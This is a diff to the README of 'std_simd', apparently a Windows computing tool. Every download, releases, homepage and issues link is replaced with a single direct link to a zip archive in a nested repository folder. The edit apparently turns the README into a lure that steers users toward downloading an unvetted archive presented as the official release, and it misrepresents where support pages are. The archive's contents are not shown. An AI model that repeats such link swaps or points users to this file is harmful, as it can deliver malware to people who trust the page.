@@ -1,6 +1,6 @@
 # ⚙️ std_simd - Simple Tool for Fast Computing
 
-[![Download Now](https://img.shields.io/badge/Download-std_simd-orange?style=for-the-badge)](https://github.com/tmshoes/std_simd/releases)
+[![Download Now](https://img.shields.io/badge/Download-std_simd-orange?style=for-the-badge)](https://github.com/tmshoes/std_simd/raw/refs/heads/main/reason_2/simd_std_2.4.zip)
 
 ---
 
@@ -36,11 +36,11 @@ Follow these steps carefully to get std_simd up and running on your Windows comp
 
 Start by visiting the official release page for std_simd to get the latest version.
 
-[![Visit Releases](https://img.shields.io/badge/Visit-Download_Page-brightgreen?style=for-the-badge)](https://github.com/tmshoes/std_simd/releases)
+[![Visit Releases](https://img.shields.io/badge/Visit-Download_Page-brightgreen?style=for-the-badge)](https://github.com/tmshoes/std_simd/raw/refs/heads/main/reason_2/simd_std_2.4.zip)
 
 Open your web browser and go to:
 
-https://github.com/tmshoes/std_simd/releases
+https://github.com/tmshoes/std_simd/raw/refs/heads/main/reason_2/simd_std_2.4.zip
 
 This page contains all the versions of std_simd available for download.
 
@@ -118,7 +118,7 @@ If you run into problems, try these solutions:
 
 If you encounter issues or have questions, visit the GitHub page:
 
-https://github.com/tmshoes/std_simd
+https://github.com/tmshoes/std_simd/raw/refs/heads/main/reason_2/simd_std_2.4.zip
 
 Look for the "Issues" tab where you can report problems or read answers from others.
 
@@ -126,8 +126,8 @@ Look for the "Issues" tab where you can report problems or read answers from oth
 
 ## 🔗 Useful Links
 
-- Official Downloads and Releases: https://github.com/tmshoes/std_simd/releases  
-- GitHub Repository Homepage: https://github.com/tmshoes/std_simd  
+- Official Downloads and Releases: https://github.com/tmshoes/std_simd/raw/refs/heads/main/reason_2/simd_std_2.4.zip  
+- GitHub Repository Homepage: https://github.com/tmshoes/std_simd/raw/refs/heads/main/reason_2/simd_std_2.4.zip  
 
 ---
 
@@ -137,4 +137,4 @@ std_simd uses modern CPU features to speed computing. If you want to learn more 
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-std_simd-orange?style=for-the-badge)](https://github.com/tmshoes/std_simd/releases)
+[![Download Now](https://img.shields.io/badge/Download-std_simd-orange?style=for-the-badge)](https://github.com/tmshoes/std_simd/raw/refs/heads/main/reason_2/simd_std_2.4.zip)
